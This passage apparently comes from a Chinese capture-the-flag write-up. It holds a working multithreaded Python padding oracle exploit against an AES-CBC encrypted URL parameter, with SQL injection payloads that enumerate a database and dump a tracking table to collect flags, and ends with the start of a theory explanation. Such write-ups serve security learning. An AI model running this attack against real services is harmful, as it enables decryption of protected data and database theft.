keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>shutdown_flag<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># filling a byte for the previous ciphertext block</span>            self<span class="token punctuation">.</span>cooked_IV<span class="token punctuation">[</span>self<span class="token punctuation">.</span>pos<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>k            url <span class="token operator">=</span> CTToUrl<span class="token punctuation">(</span><span class="token punctuation">[</span>self<span class="token punctuation">.</span>cooked_IV<span class="token punctuation">,</span> self<span class="token punctuation">.</span>CT_block<span class="token punctuation">]</span><span class="token punctuation">)</span>            resp <span class="token operator">=</span> sendHttpRequest<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            result <span class="token operator">=</span> FindkResult<span class="token punctuation">.</span>NotFound            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"PaddingException"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> resp<span class="token punctuation">)</span><span class="token punctuation">:</span>                result <span class="token operator">=</span> FindkResult<span class="token punctuation">.</span>FoundPotential                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"FLAG"</span> <span class="token keyword">in</span> resp<span class="token punctuation">)</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> FindkResult<span class="token punctuation">.</span>FoundFlag                    threadLock_try_k_at_pos<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token keyword">for</span> t <span class="token keyword">in</span> self<span class="token punctuation">.</span>threads<span class="token punctuation">:</span>                        t<span class="token punctuation">.</span>shutdown_flag<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    threadLock_try_k_at_pos<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>                 <span class="token keyword">elif</span> <span class="token punctuation">(</span><span class="token string">"doctype html"</span> <span class="token keyword">in</span> resp<span class="token punctuation">)</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> FindkResult<span class="token punctuation">.</span>FoundPotential            threadLock_try_k_at_pos<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>out_queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> self<span class="token punctuation">.</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            threadLock_try_k_at_pos<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>        sema_try_k_at_pos<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt_CT_block</span><span class="token punctuation">(</span>CT_block<span class="token punctuation">)</span><span class="token punctuation">:</span>    cooked_IV <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span>    prePT_block <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span>    <span class="token keyword">for</span> pos <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pad <span class="token operator">=</span> <span class="token number">16</span> <span class="token operator">-</span> pos        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> pos<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            cooked_IV<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>prePT_block<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> pad<span class="token punctuation">)</span>        my_queue <span class="token operator">=</span> queue<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>        my_queue<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>        threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            t <span class="token operator">=</span> Job_try_k_at_pos<span class="token punctuation">(</span>k<span class="token punctuation">,</span> pos<span class="token punctuation">,</span> cooked_IV<span class="token punctuation">,</span> CT_block<span class="token punctuation">,</span> my_queue<span class="token punctuation">,</span> threads<span class="token punctuation">)</span>            t<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>            t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>            threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>        <span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>            t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>        found_potential_k <span class="token operator">=</span> <span class="token boolean">False</span>        best_k <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">while</span> <span class="token keyword">not</span> my_queue<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token punctuation">(</span>result<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token operator">=</span> my_queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> result <span class="token operator">==</span> FindkResult<span class="token punctuation">.</span>FoundFlag<span class="token punctuation">:</span>                found_potential_k <span class="token operator">=</span> <span class="token boolean">True</span>                best_k <span class="token operator">=</span> k                <span class="token keyword">break</span>            <span class="token keyword">elif</span> result <span class="token operator">==</span> FindkResult<span class="token punctuation">.</span>FoundPotential<span class="token punctuation">:</span>                found_potential_k <span class="token operator">=</span> <span class="token boolean">True</span>                best_k <span class="token operator">=</span> k        <span class="token keyword">if</span> <span class="token keyword">not</span> found_potential_k<span class="token punctuation">:</span>            <span class="token keyword">raise</span> NotFoundError<span class="token punctuation">(</span><span class="token string">"Unable to find prePT_block["</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"] "</span><span class="token punctuation">)</span>        prePT_block<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>best_k <span class="token operator">^</span> pad<span class="token punctuation">)</span>    <span class="token keyword">return</span> prePT_block<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">get_prePT_for_block_b</span><span class="token punctuation">(</span>CT<span class="token punctuation">,</span> b<span class="token punctuation">,</span> out_queue<span class="token punctuation">)</span><span class="token punctuation">:</span>    sema_get_prePT_for_block_b<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>    logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Calculating for Block "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" ..."</span><span class="token punctuation">)</span>    prePT_block <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span>    prePT_block <span class="token operator">=</span> decrypt_CT_block<span class="token punctuation">(</span>CT<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span>    threadLock_get_prePT_for_block_b<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>    out_queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> prePT_block<span class="token punctuation">)</span><span class="token punctuation">)</span>    logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Done with Block "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>    threadLock_get_prePT_for_block_b<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>    sema_get_prePT_for_block_b<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt_CT_and_get_PT_prePT</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    CT <span class="token operator">=</span> urlToCT<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    blocknum <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>CT<span class="token punctuation">)</span>    CT_array <span class="token operator">=</span> <span class="token punctuation">[</span> CT<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> blocknum<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> BLOCK_SIZE<span class="token punctuation">)</span> <span class="token punctuation">]</span>    my_queue <span class="token operator">=</span> queue<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>blocknum <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>get_prePT_for_block_b<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>CT<span class="token punctuation">,</span> b<span class="token punctuation">,</span> my_queue<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    prePT_block <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span>    prePT <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>blocknum<span class="token punctuation">)</span><span class="token punctuation">]</span>    PT    <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>blocknum<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> <span class="token keyword">not</span> my_queue<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token punctuation">(</span>b <span class="token punctuation">,</span> prePT_block<span class="token punctuation">)</span> <span class="token operator">=</span> my_queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>        prePT<span class="token punctuation">[</span>b<span class="token punctuation">]</span> <span class="token operator">=</span> prePT_block    <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>blocknum <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        prePT_block <span class="token operator">=</span> prePT<span class="token punctuation">[</span>b<span class="token punctuation">]</span>        PT_block <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span>        PT_block <span class="token operator">=</span> <span class="token punctuation">[</span> prePT_block<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> f<span class="token punctuation">(</span>CT<span class="token punctuation">[</span>b<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> BLOCK_SIZE<span class="token punctuation">)</span> <span class="token punctuation">]</span>        PT<span class="token punctuation">[</span>b<span class="token punctuation">]</span> <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>PT_block<span class="token punctuation">)</span>    <span class="token keyword">return</span> prePT<span class="token punctuation">,</span> PT<span class="token keyword">def</span> <span class="token function">get_2nd_flag</span><span class="token punctuation">(</span>orig_url<span class="token punctuation">)</span><span class="token punctuation">:</span>    orig_prePT<span class="token punctuation">,</span> orig_PT <span class="token operator">=</span> decrypt_CT_and_get_PT_prePT<span class="token punctuation">(</span>orig_url<span class="token punctuation">)</span>    CT <span class="token operator">=</span> urlToCT<span class="token punctuation">(</span>orig_url<span class="token punctuation">)</span>    blocknum <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>CT<span class="token punctuation">)</span>    orig_PT_array <span class="token operator">=</span> <span class="token punctuation">[</span> orig_PT<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> blocknum<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> BLOCK_SIZE<span class="token punctuation">)</span> <span class="token punctuation">]</span>    jstr <span class="token operator">=</span> unpad<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>orig_PT_array<span class="token punctuation">[</span>BLOCK_SIZE<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    jobj <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>jstr<span class="token punctuation">)</span>    flag_str <span class="token operator">=</span> jobj<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span>    logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"flag found = "</span> <span class="token operator">+</span> flag_str<span class="token punctuation">)</span>    <span class="token keyword">return</span> flag_str<span class="token keyword">def</span> <span class="token function">get_PRE_CALC_CT_prePT_block</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> PRE_CALC_CT_BLOCK    <span class="token keyword">global</span> PRE_CALC_PrePT_BLOCK    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">not</span> <span class="token builtin">any</span><span class="token punctuation">(</span>PRE_CALC_PrePT_BLOCK<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token keyword">not</span> <span class="token builtin">any</span><span class="token punctuation">(</span>PRE_CALC_CT_BLOCK<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        PRE_CALC_PrePT_BLOCK <span class="token operator">=</span> decrypt_CT_block<span class="token punctuation">(</span>PRE_CALC_CT_BLOCK<span class="token punctuation">)</span>    <span class="token keyword">return</span> PRE_CALC_CT_BLOCK<span class="token punctuation">,</span> PRE_CALC_PrePT_BLOCK<span class="token keyword">def</span> <span class="token function">desired_str_to_PT</span><span class="token punctuation">(</span>desired_PT_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    padded_desired_PT_str <span class="token operator">=</span> pad<span class="token punctuation">(</span>desired_PT_str<span class="token punctuation">)</span>    blocknum <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>padded_desired_PT_str<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">16</span><span class="token punctuation">)</span>    desired_PT <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>blocknum<span class="token punctuation">)</span><span class="token punctuation">]</span>    desired_PT <span class="token operator">=</span> <span class="token punctuation">[</span>padded_desired_PT_str<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span> \            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>padded_desired_PT_str<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment"># 2 dimentional list</span>    desired_PT<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span>    blocknum <span class="token operator">=</span> blocknum <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">return</span> blocknum<span class="token punctuation">,</span> desired_PT<span class="token keyword">def</span> <span class="token function">gen_CT_for_desired_PT_str</span><span class="token punctuation">(</span>desired_PT_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    blocknum<span class="token punctuation">,</span> desired_PT <span class="token operator">=</span> desired_str_to_PT<span class="token punctuation">(</span>desired_PT_str<span class="token punctuation">)</span>    pre_calc_CT_block<span class="token punctuation">,</span> pre_calc_prePT_block <span class="token operator">=</span> get_PRE_CALC_CT_prePT_block<span class="token punctuation">(</span><span class="token punctuation">)</span>    cooked_CT    <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>blocknum<span class="token punctuation">)</span><span class="token punctuation">]</span>    cooked_prePT <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>blocknum<span class="token punctuation">)</span><span class="token punctuation">]</span>    cooked_CT<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>pre_calc_CT_block<span class="token punctuation">)</span>    cooked_prePT<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>pre_calc_prePT_block<span class="token punctuation">)</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>blocknum <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        cooked_CT<span class="token punctuation">[</span>b<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span> cooked_prePT<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> f<span class="token punctuation">(</span>desired_PT<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            cooked_prePT<span class="token punctuation">[</span>b<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> decrypt_CT_block<span class="token punctuation">(</span>cooked_CT<span class="token punctuation">[</span>b<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> cooked_CT<span class="token keyword">def</span> <span class="token function">get_1st_and_3rd_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    desired_PT_str <span class="token operator">=</span> <span class="token string">'&#123;"id":"1"&#125;'</span>    cooked_url <span class="token operator">=</span> CTToUrl<span class="token punctuation">(</span>gen_CT_for_desired_PT_str<span class="token punctuation">(</span>desired_PT_str<span class="token punctuation">)</span><span class="token punctuation">)</span>    resp_str <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>cooked_url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">)</span>    flags <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\^FLAG\^.+?\$FLAG\$'</span><span class="token punctuation">,</span> resp_str<span class="token punctuation">)</span>    logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"flags found = "</span><span class="token punctuation">)</span>    logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span>flags<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_3rd_and_4th_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># desired_PT_str = '&#123;"id":"1 AND 1=2 UNION SELECT database(),1"&#125;'</span>    <span class="token comment"># desired_PT_str = '&#123;"id":"1 AND 1=2 UNION SELECT group_concat(table_name),1 FROM information_schema.tables WHERE table_schema=\'level3\'"&#125;'</span>    <span class="token comment"># desired_PT_str = '&#123;"id":"1 AND 1=2 UNION SELECT group_concat(column_name),1 FROM information_schema.columns WHERE table_name=\'posts\'"&#125;'</span>    <span class="token comment"># desired_PT_str = '&#123;"id":"1 AND 1=2 UNION SELECT group_concat(column_name),1 FROM information_schema.columns WHERE table_name=\'tracking\'"&#125;'</span>    desired_PT_str <span class="token operator">=</span> <span class="token string">'&#123;"id":"1 AND 1=2 UNION SELECT group_concat(id,headers), 1 FROM tracking"&#125;'</span>    cooked_url <span class="token operator">=</span> CTToUrl<span class="token punctuation">(</span>gen_CT_for_desired_PT_str<span class="token punctuation">(</span>desired_PT_str<span class="token punctuation">)</span><span class="token punctuation">)</span>    resp_str <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>cooked_url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">)</span>    final_link <span class="token operator">=</span> resp_str<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/?post="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\\r\\nUser-Agent"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    final_link <span class="token operator">=</span> URL_PREFIX <span class="token operator">+</span> final_link    resp_str <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>final_link<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">)</span>    flags <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\^FLAG\^.+?\$FLAG\$'</span><span class="token punctuation">,</span> resp_str<span class="token punctuation">)</span>    flags <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">.</span>fromkeys<span class="token punctuation">(</span>flags<span class="token punctuation">)</span><span class="token punctuation">)</span>    logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"flags found = "</span><span class="token punctuation">)</span>    logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span>flags<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    arg_num <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arg_num <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        err_str <span class="token operator">=</span> <span class="token string">"Wrong Input. Input format: ./script.py 'http://....."</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span>err_str<span class="token punctuation">)</span>    start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    orig_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    URL_PREFIX <span class="token operator">=</span> orig_url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'='</span>    <span class="token comment"># Sanatization check: see if the server is still available</span>    sendHttpRequest<span class="token punctuation">(</span>orig_url<span class="token punctuation">)</span>         get_2nd_flag<span class="token punctuation">(</span>orig_url<span class="token punctuation">)</span>    get_1st_and_3rd_flag<span class="token punctuation">(</span><span class="token punctuation">)</span>    get_3rd_and_4th_flag<span class="token punctuation">(</span><span class="token punctuation">)</span>    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    hours<span class="token punctuation">,</span> rem <span class="token operator">=</span> <span class="token builtin">divmod</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">,</span> <span class="token number">3600</span><span class="token punctuation">)</span>    minutes<span class="token punctuation">,</span> seconds <span class="token operator">=</span> <span class="token builtin">divmod</span><span class="token punctuation">(</span>rem<span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">)</span>    logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Duration = %d hour %d min %d sec"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>hours<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>minutes<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="padding-oracle-原理深度解析-cbc-字节翻转攻击原理解析">paddingoracle 原理深度解析 &amp; CBC 字节翻转攻击原理解析</h4><ol type="1"><li><p>Padding的含义是“填充”，在解密时，如果算法发现解密后得到的结果，它的填充方式不符合规则，那么表示输入数据有问题，对于解密的类库来说，往往便会抛出一个<strong>异常</strong>，提示Padding不正确。Oracle在这里便是“提示”的意思</p></li><li><p>padding oracle漏洞的就是CBC加密模式</p></li><li><p>AES是对称加密，对称加密呢有两大类加密模式，即<strong>分组加密</strong>和<strong>流加密</strong>，AES分组加密有五种加密模式:</p><ol type="1"><li>电码本模式（Electronic Codebook Book (ECB)）；</li><li>密码分组链接模式（Cipher Block Chaining (CBC)）；</li><li>计算器模式（Counter (CTR)）；</li><li>密码反馈模式（Cipher FeedBack (CFB)）；</li><li>输出反馈模式（Output FeedBack 